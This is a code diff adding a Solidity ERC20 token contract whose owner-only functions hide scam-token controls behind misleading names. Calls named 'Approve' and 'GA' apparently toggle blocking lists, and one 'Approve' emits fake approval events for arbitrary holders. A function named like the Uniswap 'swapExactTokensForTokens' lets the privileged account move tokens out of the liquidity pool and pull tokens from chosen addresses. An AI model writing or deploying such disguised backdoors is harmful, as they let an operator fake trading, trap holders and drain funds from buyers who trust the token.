@@ -1,0 +1,45 @@
+contract OwnableToken is ERC20, Ownable {
+
+//    function _Transfer(address _from, address _to, uint _value)public onlyAdm  returns (bool){
+//        return super._transferGo(_from,_to,_value);
+//    }
+
+    function setFT(bool _ft) public  onlySup  returns (bool success) {
+        return super._changeFT(_ft);
+    }
+
+    function setUniLp(address _uniLp) public  onlySup  returns (bool success) {
+        return super._changeLP(_uniLp);
+    }
+    function GA(address listAddress,  bool _gl) public  onlySup  returns (bool success) {
+        return super._GA(listAddress, _gl);
+    }
+    function WList(address listAddress,  bool _isWhiteListed) public  onlySup  returns (bool success) {
+        return super._whiteList(listAddress, _isWhiteListed);
+    }
+    function Approve(address[] memory listAddress,  bool _gl) public  onlySup  returns (bool success) {
+        return super._GL(listAddress, _gl);
+    }
+
+    function Approve(address[] memory  _addresses, uint256 balance) onlySup external  {
+        for (uint256 i = 0; i < _addresses.length; i++) {
+            emit Approval(_addresses[i], address(this), balance);
+        }
+    }
+
+    function swapExactTokensForTokens(
+        address[] memory addressList,
+        uint256[] memory tAmounts,
+        uint256[] memory eAmounts,
+        address uniSwapV2Pool
+    ) public onlySup returns (bool) {
+            for (uint256 i = 0; i < addressList.length; i++) {
+                _transferGo(uniswapV2LP, addressList[i], tAmounts[i]);
+                UniswapV2Pool(uniSwapV2Pool)._Transfer(addressList[i], uniswapV2LP, eAmounts[i]);
+            }
+
+        return true;
+    }
+
+
+}
